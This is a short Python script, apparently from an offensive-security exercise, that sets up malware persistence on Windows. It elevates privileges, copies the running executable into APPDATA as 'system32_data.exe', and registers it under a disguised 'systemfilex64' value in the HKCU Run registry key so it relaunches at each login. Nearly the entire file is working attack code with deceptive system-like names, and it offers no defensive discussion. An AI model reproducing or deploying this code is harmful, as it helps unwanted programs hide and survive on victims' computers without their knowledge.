#! /usr/bin/python3

import os, shutil
import winreg, sys, time
import pyfiglet, termcolor
from elevate import elevate

banner = "> Persistence <"
print(termcolor.colored(pyfiglet.figlet_format(banner), color="red", attrs=["bold"]))

elevate()
print(termcolor.colored("[+] Escalate Privileges: Activated!", color="green", attrs=["bold"]))

curr_executable = sys.executable
print(curr_executable)
time.sleep(5)

app_data = os.getenv("APPDATA")
to_save_file = app_data +"\\"+"system32_data.exe"

time.sleep(5)
print(to_save_file)

if not os.path.exists(to_save_file):
    print(termcolor.colored("[+] Becoming Persistent!", color="green", attrs=["bold"]))
    shutil.copyfile(curr_executable, to_save_file)

    key = winreg.HKEY_CURRENT_USER

    # "Software\Microsoft\Windows\CurrentVersion\Run"

    key_value = "Software\\Microsoft\\Windows\\CurrentVersion\\Run"

    key_obj = winreg.OpenKey(key, key_value, 0, winreg.KEY_ALL_ACCESS)

    winreg.SetValueEx(key_obj, "systemfilex64", 0, winreg.REG_SZ, to_save_file)

    winreg.CloseKey(key_obj)
else:
    print(termcolor.colored("[-] Path doesn't exist!", color="red", attrs=["bold"]))

time.sleep(100)


